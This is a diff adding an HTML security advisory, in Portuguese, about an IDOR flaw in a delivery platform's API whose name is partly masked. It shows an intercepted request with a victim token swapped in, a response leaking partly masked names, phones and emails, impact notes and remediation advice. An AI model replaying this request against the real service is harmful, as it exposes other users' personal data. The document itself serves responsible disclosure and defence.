@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-br" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURITY_ADVISORY: LALAMOVE_IDOR</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;900&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #000; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        .grid-bg {
+            background-image: linear-gradient(to right, #111 1px, transparent 1px),
+                              linear-gradient(to bottom, #111 1px, transparent 1px);
+            background-size: 40px 40px;
+        }
+        .scanline {
+            width: 100%; height: 2px; background: rgba(255, 255, 255, 0.05);
+            position: fixed; top: 0; z-index: 999; pointer-events: none;
+            animation: scan 8s linear infinite;
+        }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .code-block { background: rgba(9, 9, 11, 0.8); border: 1px solid #18181b; }
+    </style>
+</head>
+<body class="bg-black text-white antialiased overflow-x-hidden">
+
+    <div class="scanline"></div>
+
+    <section class="relative pt-32 pb-20 px-6 grid-bg border-b border-zinc-900">
+        <div class="max-w-6xl mx-auto relative z-10">
+            <div class="mono text-[10px] text-red-500 tracking-[0.5em] uppercase mb-8">
+                [ ADVISORY_ID: LALAMOVE-IDOR-2026-001 ]
+            </div>
+            
+            <h1 class="text-5xl md:text-7xl font-black tracking-tighter mb-6 uppercase leading-tight">
+                Broken Access <br> Control <span class="text-zinc-600 font-light">&</span> <span class="text-white">IDOR</span>
+            </h1>
+
+            <div class="flex flex-wrap items-center gap-6">
+                <div class="border border-zinc-800 px-4 py-2 bg-zinc-950">
+                    <p class="mono text-[10px] text-zinc-500 uppercase">CVSS 3.1 Score</p>
+                    <p class="text-red-500 font-bold">8.1 (HIGH)</p>
+                </div>
+                <div class="mono text-[10px] text-gray-500 uppercase tracking-widest leading-relaxed">
+                    Vector: Network (AV:N) / Complexity: Low (AC:L) <br>
+                    Privileges: Low (PR:L) / Scope: Unchanged (S:U)
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <main class="py-24 px-6 max-w-6xl mx-auto space-y-32">
+        
+        <div class="grid md:grid-cols-12 gap-12">
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 01. VULNERABILITY_OVERVIEW</h2>
+            </div>
+            <div class="md:col-span-8">
+                <p class="text-xl font-light leading-relaxed text-zinc-300">
+                    Foi identificada uma falha critica de <span class="text-white font-semibold">Insecure Direct Object Reference (IDOR)</span> na API da plataforma <span class="text-zinc-500">La******ve</span>. O parametro de assinatura <span class="mono text-white">X-Sign-Js</span> e nulo/inefetivo, permitindo que atacantes manipulem o <span class="mono italic">token</span> para acessar dados de outros usuarios sem autorizacao.
+                </p>
+                <div class="mt-8 flex flex-wrap gap-4">
+                    <span class="px-3 py-1 border border-zinc-800 text-[10px] mono uppercase text-zinc-500">Target: web.la******ve.com</span>
+                    <span class="px-3 py-1 border border-zinc-800 text-[10px] mono uppercase text-zinc-500">Endpoint: br-uapi.la******ve.com</span>
+                    <span class="px-3 py-1 border border-zinc-800 text-[10px] mono uppercase text-red-500">Severity: CRITICAL</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid md:grid-cols-12 gap-12">
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 02. EXPLOIT_REPRODUCTION</h2>
+            </div>
+            <div class="md:col-span-8 space-y-8">
+                <div class="code-block p-6 md:p-8">
+                    <p class="mono text-[10px] text-zinc-600 mb-6 uppercase tracking-widest">Insecure_Request_Intercepted</p>
+                    <div class="overflow-x-auto">
+                        <pre class="mono text-xs md:text-sm text-zinc-400 leading-relaxed">
+<span class="text-zinc-600"># Intercept via Burp Suite Proxy</span>
+GET /index.php/?_m=get_staffs&_su=1772570778320ehll3108917431 HTTP/2
+Host: br-uapi.la******ve.com
+X-Sign-Js: eAIyY94#p4Ou5QGomNDahrAjM7BjnOtG4V17qdoQbnQ=
+Origin: https://web.la******ve.com
+
+<span class="text-zinc-600"># Parameter Manipulation</span>
+<span class="text-white font-bold">token=fa6147146148412a885e86956e0b3ca9</span> <span class="text-zinc-600">// Victim Token Injected</span></pre>
+                    </div>
+                </div>
+
+                <div class="code-block p-6 md:p-8">
+                    <p class="mono text-[10px] text-zinc-600 mb-6 uppercase tracking-widest">Unauthorized_Response_Data</p>
+                    <div class="overflow-x-auto">
+                        <pre class="mono text-xs md:text-sm text-zinc-400 leading-relaxed">{
+  "ret": 0,
+  "msg": "Sucesso",
+  "data": {
+    "staffs": [{
+      "id": "JNGkEPdN",
+      "user_fid": "NgvV8VA6",
+      <span class="text-white font-bold">"first_name": "D M***a B*****l",</span>
+      <span class="text-white font-bold">"last_name": "S****a",</span>
+      <span class="text-white font-bold">"phone": "+55 2197*****95",</span>
+      <span class="text-white font-bold">"email": "sa*****0@gmail.com",</span>
+      "role": 1,
+      "create_time": "2026-03-03"
+    }]
+  }
+}</pre>
+                    </div>
+                </div>
+
+                <div class="bg-zinc-950 p-6 border-l-2 border-red-900">
+                    <h4 class="mono text-[10px] text-red-500 font-bold uppercase mb-2">Technical Insight:</h4>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        A <span class="text-zinc-200">Business Logic</span> da API falha ao validar a correlacao entre o <span class="mono italic">token</span> fornecido e a sessao do usuario (<span class="mono">_su</span>). O parametro <span class="mono text-white">X-Sign-Js</span> deveria garantir integridade, mas aceita requisicoes mesmo quando o token e alterado, permitindo acesso nao autorizado a dados PII de qualquer usuario.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid md:grid-cols-12 gap-12">
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 03. SECURITY_IMPACT</h2>
+            </div>
+            <div class="md:col-span-8 grid md:grid-cols-2 gap-px bg-zinc-900 border border-zinc-900">
+                <div class="bg-black p-8">
+                    <h5 class="mono text-[10px] text-red-500 uppercase mb-4">Confidentiality Breach</h5>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        Exposicao completa de <span class="text-zinc-200">PII (Personally Identifiable Information)</span> incluindo nome, e-mail, telefone e IDs internos de qualquer usuario corporativo.
+                    </p>
+                </div>
+                <div class="bg-black p-8">
+                    <h5 class="mono text-[10px] text-red-500 uppercase mb-4">Mass Enumeration</h5>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        Qualquer usuario autenticado pode enumerar a base completa de clientes corporativos atraves da injecao sistematica de tokens validos.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid md:grid-cols-12 gap-12">
+            <div class="md:col-span-4 border-l border-zinc-800 pl-6">
+                <h2 class="mono text-sm text-gray-600 tracking-widest uppercase">// 04. DEVSECOPS_REMEDIATION</h2>
+            </div>
+            <div class="md:col-span-8 grid md:grid-cols-2 gap-px bg-zinc-900 border border-zinc-900">
+                <div class="bg-black p-8">
+                    <h5 class="mono text-[10px] text-zinc-500 uppercase mb-4">Acao Reativa</h5>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        Implementar <span class="text-zinc-200">Server-Side Token Validation</span>. O sistema deve vincular o <span class="mono">token</span> ao <span class="mono">_su</span> (session user) e rejeitar requisicoes onde nao houver correspondencia.
+                    </p>
+                </div>
+                <div class="bg-black p-8">
+                    <h5 class="mono text-[10px] text-zinc-500 uppercase mb-4">Defesa em Camadas</h5>
+                    <p class="text-sm text-zinc-400 leading-relaxed">
+                        Ativar validacao criptografica do <span class="mono">X-Sign-Js</span> usando HMAC-SHA256. Invalidar requisicoes quando a assinatura nao corresponder aos parametros alterados.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="bg-white text-black py-24 px-6">
+        <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-start md:items-end gap-12">
+            <div class="space-y-6">
+                <div class="h-1 w-20 bg-black"></div>
+                <h2 class="text-5xl font-black uppercase leading-none">END_OF_<br>ADVISORY</h2>
+                <p class="mono text-[10px] text-zinc-500 uppercase tracking-widest">
+                    Responsible Disclosure // 2026-03-04
+                </p>
+            </div>
+            <div class="text-right mono text-[10px] uppercase space-y-1 text-zinc-500">
+                <p>Researcher: Sa***l P*******a</p>
+                <p>Status: Disclosure_Pending</p>
+                <p>© 2026 // Encrypted_Identity</p>
+            </div>
+        </div>
+    </footer>
+
+</body>
+</html>
